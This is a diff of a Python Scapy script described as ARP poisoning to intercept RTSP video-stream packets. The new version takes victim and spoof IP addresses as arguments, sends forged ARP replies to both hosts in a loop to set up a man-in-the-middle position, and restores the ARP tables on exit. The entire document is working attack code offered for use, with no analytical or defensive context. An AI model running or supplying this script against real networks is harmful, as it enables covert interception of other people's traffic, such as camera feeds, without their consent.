@@ -1,23 +1,41 @@
 # Scapy ARP poisoning to intercept RTSP packets
 
-from time import sleep
-from scapy.all import Ether, ARP, sendp
+from scapy.all import ARP, getmacbyip, conf, get_if_addr, get_if_hwaddr, send
+import time
+import sys
 
-macAttacker = "84:fd:d1:a5:b7:43"
-ipAttacker = "192.168.1.3"
 
-macVictim = "84:fd:d1:fd:6b:00"
-ipVictim = "192.168.1.2"
+def poison(target_ip, target_mac, source_ip):
+    packet = ARP(op=2, psrc=source_ip, pdst=target_ip, hwdst=target_mac)
+    send(packet)
 
-ipToSpoof = "192.168.1.108"
 
-arp = Ether() / ARP()
-arp[Ether].src = macAttacker
-arp[ARP].hwsrc = macAttacker
-arp[ARP].psrc = ipToSpoof
-arp[ARP].hwdst = macVictim
-arp[ARP].pdst = ipVictim
+def antidote(target_ip, target_mac, source_ip, source_mac):
+    packet = ARP(op=2, psrc=source_ip, hwsrc=source_mac,
+                 pdst=target_ip, hwdst=target_mac)
+    send(packet)
 
-while True:
-    sendp(arp, iface="wlp0s20f3")
-    sleep(1)
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Incorrect number of arguments!")
+        exit(1)
+
+    victim_ip = sys.argv[1]
+    victim_mac = getmacbyip(victim_ip)
+
+    spoof_ip = sys.argv[2]
+    spoof_mac = getmacbyip(spoof_ip)
+
+    attacker_iface = conf.iface
+    attacker_ip = get_if_addr(attacker_iface)
+    attacker_mac = get_if_hwaddr(attacker_iface)
+
+    try:
+        while True:
+            poison(spoof_ip, spoof_mac, victim_ip)
+            poison(victim_ip, victim_mac, spoof_ip)
+            time.sleep(1)
+    except:
+        antidote(victim_ip, victim_mac, spoof_ip, spoof_mac)
+        antidote(spoof_ip, spoof_mac, victim_ip, victim_mac)
